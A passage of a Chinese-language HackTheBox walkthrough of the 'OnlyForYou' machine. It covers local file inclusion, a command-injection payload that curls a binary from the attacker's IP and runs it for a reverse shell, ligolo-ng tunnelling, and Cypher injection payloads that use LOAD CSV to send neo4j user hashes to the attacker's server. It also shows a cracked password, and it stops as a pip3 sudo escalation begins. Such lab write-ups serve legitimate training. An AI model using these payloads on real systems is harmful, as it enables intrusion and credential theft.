+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225052044-wycnf41.png" alt="image">​</p>
+<p>如下：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225052120-hg9cavt.png" alt="image">​</p>
+<h2 id="Exploit-os-path-join-to-get-LFI"><a href="#Exploit-os-path-join-to-get-LFI" class="headerlink" title="Exploit os.path.join to get LFI"></a>Exploit os.path.join to get LFI</h2><p>既然是這樣，所以嘗試試一下請求 <code>image=/etc/passwd</code>​</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225052346-7bo26zx.png" alt="image">​</p>
+<p>結果真的可以獲取 <code>/etc/passwd</code>​ 裏面的内容。那麽問題來了，有了LFI之後可以做些什麽？</p>
+<h2 id="Fuzzing-linux-local-file-inclusion"><a href="#Fuzzing-linux-local-file-inclusion" class="headerlink" title="Fuzzing linux local file inclusion"></a>Fuzzing linux local file inclusion</h2><p>所以我把它保存在一個文件裏面 <code>fuzz_lfi</code>​ ，然後把傳遞 <code>image</code>​ 的參數改成 <code>FUZZ</code>​：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225052623-b5eovup.png" alt="image">​</p>
+<p>之後使用常見的LFI字典，比如 <code>LFI-gracefulsecurity-linux.txt</code>​，去掃描一下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ffuf -request-proto http -request fuzz_lfi -w /Tools/Wordlists/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -mc 200 -fs 0</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225052517-zbtsfl9.png" alt="image">​</p>
+<p>其中：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225052534-wdb382l.png" alt="image">​</p>
+<p>​<code>/etc/nginx/sites-available/default</code>​ 這個路徑是放置默認的 nginx 網站配置文件，一般會有網站的目錄，所以讀取一下可以得到：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225052548-b84ll5s.png" alt="image">​</p>
+<h2 id="Fuzzing-file-on-var-www-only4you-htb"><a href="#Fuzzing-file-on-var-www-only4you-htb" class="headerlink" title="Fuzzing file on &#x2F;var&#x2F;www&#x2F;only4you.htb&#x2F;"></a>Fuzzing file on &#x2F;var&#x2F;www&#x2F;only4you.htb&#x2F;</h2><p>由於 <code>only4you.htb</code>​ 裏的内容還沒有看過，所以再一次 fuzz 一下：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225052648-dtm2hcy.png" alt="image">​</p>
+<p>由於不需要fuzz整個linux path，所以可以換一個字典，這裏使用的是 <code>SVNDigger/all.txt</code>​ 裏面包括一些常見的用戶名：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ffuf -request-proto http -request fuzz_lfi -w /Tools/Wordlists/SecLists/Discovery/Web-Content/SVNDigger/all.txt  -mc 200 -fs 0</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225053354-e4ds1z8.png" alt="image">​</p>
+<p>得到了 <code>app.py</code>​ ，所以 <code>only4you.htb</code>​ 這個網站下也是 python 寫的。</p>
+<h2 id="Fuzzing-py-extension-file-on-var-www-only4you-htb"><a href="#Fuzzing-py-extension-file-on-var-www-only4you-htb" class="headerlink" title="Fuzzing py extension file on &#x2F;var&#x2F;www&#x2F;only4you.htb&#x2F;"></a>Fuzzing py extension file on &#x2F;var&#x2F;www&#x2F;only4you.htb&#x2F;</h2><p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225053432-td9xsby.png" alt="image">​</p>
+<p>既然知道是 <code>py</code>​ 結尾的，那就可以繼續 fuzz <code>py</code>​ 後綴名：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225231953-fdg8mar.png" alt="image">​</p>
+<p>得到 <code>app.py</code>​ 和 <code>form</code>​ 這兩個。</p>
+<h2 id="Analysis-source-code"><a href="#Analysis-source-code" class="headerlink" title="Analysis source code"></a>Analysis source code</h2><p>通過lfi 訪問 <code>/var/www/only4you.htb/app.py</code>​ 可以看得到他是調用了 <code>form.py</code>​ 這個文件：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225053544-xejc324.png" alt="image">​</p>
+<p>所以嘗試請求 <code>/var/www/only4you.htb/form.py</code>​，可以看到：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225053606-2tgtedk.png" alt="image">​</p>
+<p>由於burp 顯示排版有問題，所以嘗試保存到文件中，打開后看到這一行：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225053704-cdhha5f.png" alt="image">​</p>
+<p>其中這一行非常有意思：沒有匹配到，就返回 1 ，如果匹配到了就繼續執行，這裏的匹配不是完全匹配，而是一堆文字裏面出現上面的正則表達式就算匹配到。</p>
+<p>也就是說，當我的payload是這樣的時候：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mane@manesec.com ; curl 10.10.16.31/mane -o /tmp/mane ; <span class="built_in">chmod</span> 777 /tmp/mane ; /tmp/mane</span><br></pre></td></tr></table></figure>
+
+<p>如果正則表達式 <code>([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]&#123;2,&#125;)</code>​ 可以匹配文字裏的内容，也就是上面的 <code>mane@manesec.com</code>​，就繼續執行。</p>
+<p>然後到達這裏：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">domain = email.split(<span class="string">&quot;@&quot;</span>, <span class="number">1</span>)[<span class="number">1</span>]                                                                                                                                                                </span><br><span class="line">result = run([<span class="string">f&quot;dig txt <span class="subst">&#123;domain&#125;</span>&quot;</span>], shell=<span class="literal">True</span>, stdout=PIPE)                                                                                                                                   </span><br><span class="line">output = result.stdout.decode(<span class="string">&#x27;utf-8&#x27;</span>)     </span><br></pre></td></tr></table></figure>
+
+<p>之後這裏的 <code>domain = email.split(&quot;@&quot;, 1)[1]</code>​ 對應的上面的payload 是 <code>manesec.com ; curl 10.10.16.31/mane -o /tmp/mane ; chmod 777 /tmp/mane ; /tmp/mane</code>​值得注意的是 <code>shell=True</code>​ 暗示著使用shell來執行，所以實際上就運行 <code>dig manesec.com ; curl 10.10.16.31/mane -o /tmp/mane ; chmod 777 /tmp/mane ; /tmp/mane</code>​</p>
+<p>這樣就可以得到 reverse shell。</p>
+<h2 id="Send-email-to-gain-reverse-shell"><a href="#Send-email-to-gain-reverse-shell" class="headerlink" title="Send email to gain reverse shell"></a>Send email to gain reverse shell</h2><p>所以打開在 <code>only4you.htb</code>​：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225054340-jj9njuc.png" alt="image">​</p>
+<p>隨便發送一些郵件，使用burp截取一下：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225054250-6w4b1tr.png" alt="image">​</p>
+<p>然後把 payload 轉換成 url 編碼，發送後就得到了 web shell ：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225054404-dlbz3ay.png" alt="image">​</p>
+<p>看了一下本地的端口：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225054510-tr7ikim.png" alt="image">​</p>
+<p>發現本地還存放著其他的服務，所以需要端口轉發到本地，由於 <code>www-data</code>​ 在 <code>/etc/passwd</code>​ 中被設定成了 <code>/usr/sbin/nologin</code>​ ，所以不能使用 ssh 來端口轉發：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225232958-1w43r4t.png" alt="image">​</p>
+<h2 id="Setup-ligolo-ng-tunnel"><a href="#Setup-ligolo-ng-tunnel" class="headerlink" title="Setup ligolo-ng tunnel"></a>Setup ligolo-ng tunnel</h2><p>可以使用 <a target="_blank" rel="noopener" href="https://github.com/jpillora/chisel">chisel </a>或者 <a target="_blank" rel="noopener" href="https://github.com/nicocha30/ligolo-ng">ligolo-ng</a>，關於用法可以參考：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://0xdf.gitlab.io/cheatsheets/tunneling">PWK Notes: Tunneling and Pivoting</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/nicocha30/ligolo-ng/wiki">https://github.com/nicocha30/ligolo-ng/wiki</a></li>
+</ul>
+<p>首先先讓 <a target="_blank" rel="noopener" href="https://github.com/nicocha30/ligolo-ng">ligolo-ng</a> 的 agent 和 server 進行通訊：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 本地 kali</span></span><br><span class="line">$ sudo ./proxy -laddr 0.0.0.0:6666 -selfcert</span><br><span class="line"></span><br><span class="line"><span class="comment"># 對面機器</span></span><br><span class="line">www-data@only4you:/tmp$ ./agent -connect 10.10.16.31:6666 -retry -ignore-cert</span><br></pre></td></tr></table></figure>
+
+<p>連接好了之後如下圖：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225054611-ekypzrw.png" alt="image">​</p>
+<p>從<a target="_blank" rel="noopener" href="https://github.com/nicocha30/ligolo-ng/wiki/Localhost">官方文檔</a>中，可以看到需要轉發 <code>240.0.0.1</code>​：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225233226-tumzjuw.png" alt="image">​</p>
+<p>所以需要新建一個interface，然後把 <code>240.0.0.1/32</code>​ 綁定到該路由，這裏就叫 <code>mane</code>​，之後啓動監聽：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[Agent : www-data@only4you] » iflist </span><br><span class="line">[Agent : www-data@only4you] » ifcreate --name mane</span><br><span class="line">[Agent : www-data@only4you] » route_add --name mane --route 240.0.0.1/32</span><br><span class="line">[Agent : www-data@only4you] » start --tun mane</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225054729-6lwif9p.png" alt="image">​</p>
+<p>成功了之後嘗試訪問對面機器的端口，比如3000，如果可以正常顯示，那麽就成功了：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225054812-pegbup8.png" alt="image">​</p>
+<p>3000 端口是一個 <code>Gogs</code>​，類似代碼倉庫的東西，7474是 <code>neo4j</code>​ 的服務器：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225054831-m97i202.png" alt="image">​</p>
+<h1 id="Walking-around-port-8001-and-neo4j"><a href="#Walking-around-port-8001-and-neo4j" class="headerlink" title="Walking around port 8001 and neo4j"></a>Walking around port 8001 and neo4j</h1><p>8001 這裏有一個後臺頁面：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225054850-xf3znza.png" alt="image">​</p>
+<p>如果使用 <code>admin:admin</code>​ 登錄的話會得到：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225054905-8u6xid1.png" alt="image">​</p>
+<p>然後 <code>dashboard</code>​ 這裏可以搜索一些東西：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225054938-lb1we3k.png" alt="image">​</p>
+<p>使用 burp 截取了東西后嘗試跑一下 sqlmap，結果失敗了：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225055011-5hpuabo.png" alt="image">​</p>
+<p>這就意味著該服務器可能是 neo4j。</p>
+<h2 id="Induction-for-neo4j-injection-And-Guessing-injection-location"><a href="#Induction-for-neo4j-injection-And-Guessing-injection-location" class="headerlink" title="Induction for neo4j injection And Guessing injection location"></a>Induction for neo4j injection And Guessing injection location</h2><p>所以可以嘗試搜索一下 neo4j 的 注入：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225055134-sadci9m.png" alt="image">​</p>
+<p>看到這篇：<a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j">https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j</a></p>
+<p>裏面有另外兩篇的鏈接：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits">https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits</a></li>
+<li><a target="_blank" rel="noopener" href="https://infosecwriteups.com/the-most-underrated-injection-of-all-time-cypher-injection-fa2018ba0de8">https://infosecwriteups.com/the-most-underrated-injection-of-all-time-cypher-injection-fa2018ba0de8</a></li>
+</ul>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225055125-57any7i.png" alt="image">​</p>
+<p>另外還找到了比較全面的injection：<a target="_blank" rel="noopener" href="https://pentester.land/blog/cypher-injection-cheatsheet/">https://pentester.land/blog/cypher-injection-cheatsheet/</a></p>
+<p>這裏就總結一下：</p>
+<blockquote>
+<p>在 Neo4j 中，數據庫的結構與傳統的關係型數據庫不同，因為它是基於圖形的數據庫。Neo4j 中沒有「表」的概念，而是由「節點」和「關係」組成。你可以使用 Cypher 查詢語言來獲取數據。</p>
+<p>如果你想查看數據庫中的所有節點類型和關係類型，可以使用以下 Cypher 查詢：</p>
+<p><strong>獲取服務器的信息</strong>：<code>CALL dbms.components()</code>​</p>
+<p><strong>獲取所有節點的標籤</strong>： <code>CALL db.labels()</code>​</p>
+<p><strong>獲取所有關係的類型</strong>：<code>CALL db.relationshipTypes()</code>​</p>
+<p><strong>查看節點的所有屬性</strong>：<code>MATCH (n:Person) RETURN keys(n) AS properties</code>​</p>
+</blockquote>
+<p>在這一篇中 <a target="_blank" rel="noopener" href="https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits">https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits</a></p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225055509-cb83xe8.png" alt="image">​</p>
+<p>他告訴我需要猜測一下 injection 的位置，也就是運行語法時的位置，由於搜索 id 的那個位置更有可能是 <code>MATCH (o) WHERE o.id = &quot;&#123;input&#125;&quot;</code>​，所以假設我要獲取服務器的版本信息：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225064426-lr04nkh.png" alt="image">​</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225065235-zizyse4.png" alt="image">​</p>
+<p>所以嘗試開一個服務器看看能不能收到查詢的結果，如果可以就可以查詢一些内容返回到http 服務器上：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; OR 1=1 WITH 1 as _l00 CALL dbms.components()  yield name LOAD CSV FROM &#x27;http://10.10.16.31/&#x27;   name as _l RETURN 1 //</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225061229-jn0ufhs.png" alt="image">​</p>
+<p>就得到了版本内核的名字。</p>
+<h2 id="Guessing-Label"><a href="#Guessing-Label" class="headerlink" title="Guessing Label"></a>Guessing Label</h2><p>既然成功了可以返回内容，那麽説明猜測注入的位置是對的。所以開始執行其他的語句，首先最需要知道的是 Label，label 可以看成是一個節點的類型。</p>
+<p>爲了增加成功率在本地開一個 neo4j 去測試，由於需要發送到 http 服務器，需要把查詢結果給合并成一個字符串，然後使用 <code>LOAD CSV FROM</code>​，<code>reduce</code>​ 就可以完成這一件事，所以在本地的 neo4j 測試中得到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CALL db.labels() YIELD label</span><br><span class="line">WITH COLLECT(label) AS labels</span><br><span class="line">RETURN reduce(result = &#x27;&#x27;, label IN labels | result + label + &#x27;, &#x27;) AS testing</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225072045-oringaa.png" alt="image">​</p>
+<p>可以用來查詢所有節點的信息并且合并成字符串，然後替換掉上面的payload 就會變成如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; OR 1=1 WITH 1 as qq CALL db.labels() YIELD label WITH COLLECT(label) AS labels with reduce(result = &#x27;&#x27;, label IN labels | result   label   &#x27;, &#x27;) AS testing LOAD CSV FROM &quot;http://10.10.16.31/?a=&quot; testing as mane RETURN 0 as _o // </span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225071946-jkd5uzc.png" alt="image">​</p>
+<p>可以看到他重複了四次，因爲 with 可以被看成是一個管道，所以只需要加一個 <code>limit 1</code>​ 即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; OR 1=1 WITH 1 as qq limit 1 CALL db.labels() YIELD label WITH COLLECT(label) AS labels with reduce(result = &#x27;&#x27;, label IN labels | result   label   &#x27;, &#x27;) AS testing LOAD CSV FROM &quot;http://10.10.16.31/?a=&quot; + testing as mane RETURN 0 as _o // </span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225071935-p98diut.png" alt="image">​</p>
+<p>然後節點的類型是 <code>user</code>​ 和 <code>employee</code>​。</p>
+<p>‍</p>
+<h2 id="Guessing-RelationshipTypes"><a href="#Guessing-RelationshipTypes" class="headerlink" title="Guessing RelationshipTypes"></a>Guessing RelationshipTypes</h2><p>既然是這樣，也可以猜測下某個節點和某個節點中有什麽關係，獲取關係的函數如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CALL db.relationshipTypes()</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225075532-sn9edeb.png" alt="image">​</p>
+<p>把他合并成一個字符串如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CALL db.relationshipTypes()  YIELD relationshipType WITH COLLECT(relationshipType) AS relationshipTypes with reduce(result = &#x27;&#x27;, relationshipType IN relationshipTypes | result + relationshipType + &#x27;, &#x27;) AS testing return testing</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225075546-a5zjkmm.png" alt="image">​</p>
+<p>改成payload后如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; OR 1=1 WITH 1 as qq limit 1 CALL db.relationshipTypes()  YIELD relationshipType WITH COLLECT(relationshipType) AS relationshipTypes with reduce(result = &#x27;&#x27;, relationshipType IN relationshipTypes | result + relationshipType + &#x27;, &#x27;) AS testing LOAD CSV FROM &quot;http://10.10.16.31/?a=&quot; + testing as mane RETURN 0 as _o // </span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225080143-7p5zgzn.png" alt="image">​</p>
+<p>結果是空的，空的説明節點和節點之間沒有任何關係。</p>
+<h2 id="Guessing-Properties-and-Exploit"><a href="#Guessing-Properties-and-Exploit" class="headerlink" title="Guessing Properties and Exploit"></a>Guessing Properties and Exploit</h2><p>既然有了節點的類型，那麽就可以獲取節點的屬性，所以看一下一個節點裏面有什麽屬性，在本地的測試中獲取 <code>User</code>​ 的語法是這樣的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MATCH (n:User) with keys(n) AS properties limit 1 UNWIND properties as propertie with reduce(result = &#x27;&#x27;, propertie IN properties | result + propertie + &#x27;, &#x27;) AS testing limit 1 return testing</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225081618-ncildrw.png" alt="image">​</p>
+<p>把他發送到遠程的服務器語法是這樣的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MATCH (n:User) with keys(n) AS properties limit 1 UNWIND properties as propertie with reduce(result = &#x27;&#x27;, propertie IN properties | result + propertie + &#x27;, &#x27;) AS testing limit 1 LOAD CSV FROM &quot;http://10.10.16.31/?a=&quot; + testing as mane RETURN 0 as _o //</span><br></pre></td></tr></table></figure>
+
+<p>由於上面是 <code>User</code>​但是對面的服務器是 <code>user</code>​，所以payload就是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; OR 1=1 WITH 1 as qq limit 1 MATCH (n:user) with keys(n) AS properties limit 1 UNWIND properties as propertie with reduce(result = &#x27;&#x27;, propertie IN properties | result + propertie + &#x27;, &#x27;) AS testing limit 1 LOAD CSV FROM &quot;http://10.10.16.31/?a=&quot; + testing as mane RETURN 0 as _o //</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225081820-kud79l2.png" alt="image">​</p>
+<p>得到這個節點的屬性有 <code>password</code>​ 和 <code>username</code>​，也就是 <code>user.password</code>​ 和 <code>user.username</code>​，這個時候就可以僞造一個payload來獲取數據庫裏面的内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">match (mane:User) with mane.username + &quot;  &quot; + mane.password as result skip 0 limit 1 LOAD CSV FROM &quot;http://10.10.16.31/?a=&quot; + result as manesec RETURN 0 as _o //</span><br></pre></td></tr></table></figure>
+
+<p>其中的 <code>skip 0</code>​ 是 offset，這樣就得到：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225082705-uvay7le.png" alt="image">​</p>
+<p>這樣就得到了用戶名和密碼。 由於 <code>skip 0</code>​ 是第一個用戶，所以可以使用 <code>Intruder</code>​ 來從0開始到100，這樣就可以提取全部的用戶，這裏先從 0 到 10 看一下效果：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225082816-tw73imr.png" alt="image">​</p>
+<p>設置好后運行就得到：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225082829-caqvcn3.png" alt="image">​</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">10.129.250.120 - - [25/Dec/2024 08:28:18] code 400, message Bad request syntax (&#x27;GET /?a=admin  8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1&#x27;)</span><br><span class="line">10.129.250.120 - - [25/Dec/2024 08:28:18] &quot;GET /?a=admin  8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1&quot; 400 -</span><br><span class="line">10.129.250.120 - - [25/Dec/2024 08:28:18] code 400, message Bad request syntax (&#x27;GET /?a=admin  8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1&#x27;)</span><br><span class="line">10.129.250.120 - - [25/Dec/2024 08:28:18] &quot;GET /?a=admin  8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1&quot; 400 -</span><br><span class="line">10.129.250.120 - - [25/Dec/2024 08:28:19] code 400, message Bad request syntax (&#x27;GET /?a=john  a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1&#x27;)</span><br><span class="line">10.129.250.120 - - [25/Dec/2024 08:28:19] &quot;GET /?a=john  a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1&quot; 400 -</span><br></pre></td></tr></table></figure>
+
+<p>看到 <code>john</code>​ 存在 <code>/etc/passwd</code>​ 這個文件中：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225083115-lrjk54j.png" alt="image">​</p>
+<p>所以嘗試跑一下hashcat：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225083046-qcp33kq.png" alt="image">​</p>
+<p>得到密碼</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6:ThisIs4You</span><br></pre></td></tr></table></figure>
+
+<p>所以可以嘗試 su 到 <code>john</code>​，結果就得到了 user shell</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225083140-i9qplww.png" alt="image">​</p>
+<h1 id="Exploit-with-sudo-for-pip3-downlaod"><a href="#Exploit-with-sudo-for-pip3-downlaod" class="headerlink" title="Exploit with sudo for pip3 downlaod"></a>Exploit with sudo for pip3 downlaod</h1><p>看到  john 可以以root的身份運行：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(root) NOPASSWD: /usr/<span class="built_in">bin</span>/pip3 download http\://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>\:<span class="number">3000</span>/*.tar.gz</span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<p>也就是想辦法讓 pip3 安裝惡意軟件包，所以搜索下，</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225083253-4v0f7n0.png" alt="image">​</p>
+<p>看到這篇：<a target="_blank" rel="noopener" href="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/pip-download-code-execution/">https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/pip-download-code-execution/</a></p>
+<p>首先在本地的環境下運行下面的命令準備exploit：</p>
